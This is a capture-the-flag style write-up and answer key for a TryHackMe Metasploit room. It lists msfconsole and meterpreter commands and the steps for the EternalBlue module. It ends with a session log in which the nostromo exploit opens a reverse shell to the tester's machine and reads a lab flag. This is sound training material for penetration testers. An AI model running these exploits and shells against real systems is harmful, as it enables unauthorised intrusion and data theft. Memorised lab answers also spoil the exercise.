# TryHackMe [CC: Pen Testing](https://tryhackme.com/room/ccpentesting) Metasploit
### References
* Dillon, S., Davis, D., Equation Group, Shadow Brokers, & thelightcosine. (2018, May 30). MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption. Rapid7. https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
* Offensive Security. (2019). `meterpreter` Basic Commands. Offensive Security. https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
* Offensive Security. (2019). MSFconsole Commands. Offensive Security. https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/
## Setting Up
### What command allows you to search modules?
**Answer**: `search`
### How do you select a module?
**Answer**: `use`
### How do you display information about a specific module?
**Answer**: `info`
### How do you list options that you can set?
**Answer**: `options`
### What command lets you view advanced options for a specific module?
**Answer**: `advanced`
### How do you show options in a specific category
**Answer**: `show`
## Selecting a module
### How do you select the `eternalblue` module?
**Answer**: `use exploit/windows/smb/ms17_010_eternalblue`
### What option allows you to select the target host(s)?
**Answer**: `RHOSTS`
### How do you set the target port?
**Answer**: `RPORT`
### What command allows you to set options?
**Answer**: `set`
### How would you set `SMBPass` to "`username`"?
**Answer**: `set SMBPass username`
### How would you set the SMBUser to "password"?
**Answer**: `set SMBUser password`
### What option sets the architecture to be exploited?
**Answer**: `arch`
### What option sets the payload to be sent to the target machine?
**Answer**: `payload`
### Once you've finished setting all the required options, how do you run the exploit?
**Answer**: `exploit`
### What flag do you set if you want the exploit to run in the background?
**Answer**: `-j`
### How do you list all current sessions?
**Answer**: `sessions`
### What flag allows you to go into interactive mode with a session("drops you either into a meterpreter or regular shell")
**Answer**: `-i`
## `meterpreter`
### What command allows you to download files from the machine?
**Answer**: `download`
### What command allows you to upload files to the machine?
**Answer**: `upload`
### How do you list all running processes?
**Answer**: `ps`
### How do you change processes on the victim host (ideally it will allow you to change users and gain the perms associated with that user)?
**Answer**: `migrate`
### What command lists files in the current directory on the remote machine?
**Answer**: `ls`
### How do you execute a command on the remote host?
**Answer**: `execute`
### What command starts an interactive shell on the remote host?
**Answer**: `shell`
### How do you find files on the target host (similar function to the linux command "find")?
**Answer**: `search`
### How do you get the output of a file on the remote host?
**Answer**: `cat`
### How do you put a `meterpreter` shell into "background mode" (allows you to run other msf modules while also keeping the `meterpreter` shell as a session)?
**Answer**: `background`
## Final Walkthrough
### Select the module that needs to be exploited
**Answer**: `use exploit/multi/http/nostromo_code_exec`
### What variable do you need to set, to select the remote host?
**Answer**: `RHOSTS`
### How do you set the port to 80?
**Answer**: `set RPORT 80`
### How do you set listening address (your machine)?
**Answer**: `LHOST`
### What is the name of the secret directory in the `/var/nostromo/htdocs` directory?
```
msf6 exploit(multi/http/nostromo_code_exec) > set RHOSTS <MACHINE_IP>
RHOSTS => <MACHINE_IP>
msf6 exploit(multi/http/nostromo_code_exec) > set RPORT 80
RPORT => 80
msf6 exploit(multi/http/nostromo_code_exec) > set LHOST tun0
LHOST => <OPENVPN_IP>
msf6 exploit(multi/http/nostromo_code_exec) > run

[*] Started reverse TCP handler on <OPENVPN_IP>:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (<OPENVPN_IP>:4444 -> <MACHINE_IP>:36402) at 2021-04-17 14:55:53 +1000

shell
_nostromo@ubuntu:/bin$ cd /var/nostromo/htdocs
_nostromo@ubuntu:/var/nostromo/htdocs$ ls -la
total 20
drwxr-xr-x 3 _nostromo _nostromo 4096 Dec  5  2019 .
drwxr-xr-x 6 _nostromo _nostromo 4096 Dec  5  2019 ..
-rw-r--r-- 1 _nostromo _nostromo  564 Dec  5  2019 index.html
-rw-r--r-- 1 _nostromo _nostromo 1827 Dec  5  2019 nostromo.gif
drwxr-xr-x 2 root      root      4096 Dec  5  2019 s3cretd1r
```
**Answer**: `s3cretd1r`
### What are the contents of the file inside of the directory?
```
_nostromo@ubuntu:/var/nostromo/htdocs$ cd s3cretd1r
_nostromo@ubuntu:/var/nostromo/htdocs/s3cretd1r$ ls
nice
_nostromo@ubuntu:/var/nostromo/htdocs/s3cretd1r$ cat nice
Woohoo!
_nostromo@ubuntu:/var/nostromo/htdocs/s3cretd1r$
```
**Answer**: `Woohoo!`